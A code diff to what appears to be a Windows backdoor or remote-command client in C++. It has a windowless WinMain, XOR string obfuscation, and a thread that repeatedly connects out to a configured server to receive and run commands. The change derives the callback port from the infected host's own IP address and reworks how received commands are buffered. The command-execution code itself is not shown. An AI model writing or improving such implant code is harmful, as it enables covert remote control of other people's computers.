@@ -1,14 +1,10 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include <process.h>
-#include <algorithm>
 #define _WINSOCKAPI_
 #include <winsock2.h>
 #include <windows.h>
-#include <time.h>
 #include <string>
-#include <fstream>
-#include <stdexcept>
 
 using namespace std;
 
@@ -32,6 +28,34 @@ void crypt(std::string &m) {
 	for (std::string::size_type i = 0; i < m.length(); i++) {
 		m[i] ^= key[i % key.length()];
 	}
+}
+
+int getLastOctet()
+{
+	char szBuffer[1024];
+	WSADATA wsaData;
+	WORD wVersionRequested = MAKEWORD(2, 0);
+	if (WSAStartup(wVersionRequested, &wsaData) != 0)
+		return 0;
+
+	if (gethostname(szBuffer, sizeof(szBuffer)) == SOCKET_ERROR)
+	{
+		WSACleanup();
+		return 0;
+	}
+
+	struct hostent *host = gethostbyname(szBuffer);
+	if (host == NULL)
+	{
+		WSACleanup();
+		return 0;
+	}
+
+	int last_octet = ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b3 * 10;
+	last_octet += ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b4;
+
+	WSACleanup();
+	return last_octet;
 }
 
 void exec2(cmdcall *p)
@@ -98,7 +122,6 @@ bool running = true;
 
 void connector(void *params)
 {
-	srand(time(NULL));
 	char recvbuf[DEFAULT_BUFLEN];
 	int recvbuflen = DEFAULT_BUFLEN;
 
@@ -124,8 +147,9 @@ void connector(void *params)
 			continue;
 		}
 
+		int port = 58800 + getLastOctet();
 		addr.sin_family = AF_INET;
-		addr.sin_port = htons(8888);
+		addr.sin_port = htons(port);
 		addr.sin_addr.S_un.S_addr = inet_addr(ip.c_str());
 
 		// create a socket for connecting to server
@@ -189,8 +213,10 @@ void connector(void *params)
 			if (iResult > 0)
 			{
 				recvbuf[iResult] = '\0';
-				recvq += recvbuf;
+				recvq = recvbuf;
 			}
+			else
+				recvq = "";
 
 			// do something
 			if (recvq.length() > 0) {
@@ -238,4 +264,5 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE prev, LPSTR cmd, int show)
 		WaitForSingleObject(hThread, INFINITE);
 		Sleep(500);
 	}
+	return 1;
 }
